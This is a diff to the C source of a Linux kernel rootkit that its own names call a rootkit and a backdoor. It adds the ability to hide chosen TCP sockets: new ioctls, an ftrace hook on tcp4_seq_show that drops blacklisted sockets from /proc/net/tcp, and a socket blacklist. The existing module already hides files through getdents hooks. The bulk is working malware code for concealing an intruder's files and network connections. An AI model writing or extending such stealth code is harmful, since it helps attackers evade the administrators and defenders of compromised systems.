@@ -11,11 +11,13 @@
 #include <linux/seq_file.h>
 #include <linux/dirent.h>
 #include <crypto/chacha.h>
+#include <linux/tcp.h>
 #include "bdoor.h"
 #include "bdoor_common.h"
 #ifdef CONFIG_X86_64
 #include "hidden_entry.h"
 #include "whitelist.h"
+#include "net_hider.h"
 #endif
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Ethan, Cyrus, and Nick");
@@ -96,7 +98,7 @@ out:
 }
 
 static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
-static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
+static asmlinkage ssize_t (*orig_urandom_read)(struct file *file,char __user *buf,size_t nbytes, loff_t *ppos);
 
 
 static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
@@ -150,7 +152,7 @@ out:
 	return err;
 #else
 	return -ENOTSUP;
-#endif
+#endif //CONFIG_X86_64
 }
 
 static long hide_ioctl(struct file *file, unsigned long arg)
@@ -168,7 +170,7 @@ out:
 	return ret;
 #else
 	return -ENOTSUP;
-#endif
+#endif //CONFIG_X86_64
 }
 
 
@@ -187,7 +189,7 @@ out:
 	return ret;
 #else
 	return -ENOTSUP;
-#endif
+#endif //CONFIG_X86_64
 }
 
 static long list_hidden_ioctl(struct file *file, unsigned long arg)
@@ -258,7 +260,7 @@ out:
 	return ret;
 #else
 	return -ENOTSUP;
-#endif
+#endif //CONFIG_X86_64
 }
 
 static long whit_rem_ioctl(struct file *file, unsigned long arg)
@@ -276,7 +278,7 @@ out:
 	return ret;
 #else
 	return -ENOTSUP;
-#endif
+#endif //CONFIG_X86_64
 }
 
 static long whit_show_ioctl(struct file *file, unsigned long arg)
@@ -286,7 +288,7 @@ static long whit_show_ioctl(struct file *file, unsigned long arg)
 	return 0;
 #else
 	return -ENOTSUP;
-#endif
+#endif //CONFIG_X86_64
 }
 
 static long change_comm_ioctl(struct file *file, unsigned long arg)
@@ -302,6 +304,42 @@ static long change_comm_ioctl(struct file *file, unsigned long arg)
 	memcpy(current->comm,newname.name,MIN(strlen(newname.name),TASK_COMM_LEN));
 out:
 	return ret;
+}
+
+static long hide_port_ioctl(struct file *file, unsigned long arg)
+{
+#ifdef CONFIG_X86_64
+	long ret = 0;
+	struct sock_request request;
+	if (copy_from_user(&request, (struct sock_request*) arg,
+				sizeof(struct sock_request))) {
+		ret = -EFAULT;
+		goto out;
+	}
+	process_sockadd_request(&request);
+out:
+	return ret;
+#else
+	return -ENOTSUP;
+#endif //CONFIG_X86_64
+}
+
+static long show_port_ioctl(struct file *file, unsigned long arg)
+{
+#ifdef CONFIG_X86_64
+	long ret = 0;
+	struct sock_request request;
+	if (copy_from_user(&request, (struct sock_request*) arg,
+				sizeof(struct sock_request))) {
+		ret = -EFAULT;
+		goto out;
+	}
+	process_sockrem_request(&request);
+out:
+	return ret;
+#else
+	return -ENOTSUP;
+#endif //CONFIG_X86_64
 }
 
 static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
@@ -364,6 +402,14 @@ static long rkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
 	case CHANGE_COMM_IOCTL:
 		ret = change_comm_ioctl(file,arg);
+		break;
+
+	case HIDE_PORT_IOCTL:
+		ret = hide_port_ioctl(file,arg);
+		break;
+
+	case SHOW_PORT_IOCTL:
+		ret = show_port_ioctl(file,arg);
 		break;
 	default:
 		ret = -ENOTTY;
@@ -565,9 +611,26 @@ static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *di
 
 #endif //PTREGS_SYSCALL_STUBS
 
+
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	struct inet_sock *is;
+
+	if (v != SEQ_START_TOKEN) {
+		is = (struct inet_sock *)v;
+		if (check_socket_blacklist(is))
+			return 0;
+	}
+
+	return orig_tcp4_seq_show(seq, v);
+}
+
 static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
 	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
 static void remove_all_hooks(void)
@@ -604,6 +667,10 @@ static void init_tables_and_locks(void)
         spin_lock_init(&gid_whitelist_lock);
         atomic_set(&gid_whitelist_users,0);
         rhashtable_init(&gid_whitelist,&gid_whitelist_params);
+
+	spin_lock_init(&socket_blacklist_lock);
+	atomic_set(&socket_blacklist_users,0);
+	rhashtable_init(&socket_blacklist,&socket_blacklist_params);
 }
 
 static void free_tables_and_locks(void)
@@ -622,6 +689,9 @@ static void free_tables_and_locks(void)
 
 	while(atomic_read(&gid_whitelist_users)){}
         rhashtable_free_and_destroy(&gid_whitelist,gid_whitelist_free_entry,NULL);
+
+	while(atomic_read(&socket_blacklist_users)){}
+	rhashtable_free_and_destroy(&socket_blacklist,socket_blacklist_free_entry,NULL);
 }
 
 static int __init rootkit_init(void)
@@ -641,10 +711,16 @@ static int __init rootkit_init(void)
 		error = -ENOMEM;
 		goto whitelist_proc_create_cleanup;
 	}
+	socket_blacklist_viewer = proc_create(procfs_socket_blacklist_name,0000,
+					NULL,&socket_blacklist_ops);
+	if (!socket_blacklist_viewer) {
+		error = -ENOMEM;
+		goto socket_proc_create_cleanup;
+	}
 	error = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
 	if (error)
 		goto install_hooks_cleanup;
-#endif
+#endif //CONFIG_X86_64
 	error = misc_register(&rkit_dev);
 	if (error)
                 goto misc_register_cleanup;
@@ -654,12 +730,14 @@ misc_register_cleanup:
 #ifdef CONFIG_X86_64
 	remove_all_hooks();
 install_hooks_cleanup:
+	proc_remove(socket_blacklist_viewer);
+socket_proc_create_cleanup:
 	proc_remove(whitelist_viewer);
 whitelist_proc_create_cleanup:
 	proc_remove(hidden_file_viewer);
 hidden_proc_create_cleanup:
 	free_tables_and_locks();
-#endif
+#endif //CONFIG_X86_64
 	return error;
 }
 
@@ -670,13 +748,14 @@ static void __exit rootkit_exit(void)
 	free_tables_and_locks();
 
 	remove_all_hooks();
-#endif
+#endif //CONFIG_X86_64
 
 	misc_deregister(&rkit_dev);
 #ifdef CONFIG_X86_64
+	proc_remove(socket_blacklist_viewer);
 	proc_remove(hidden_file_viewer);
 	proc_remove(whitelist_viewer);
-#endif
+#endif //CONFIG_X86_64
 }
 
 module_init(rootkit_init);
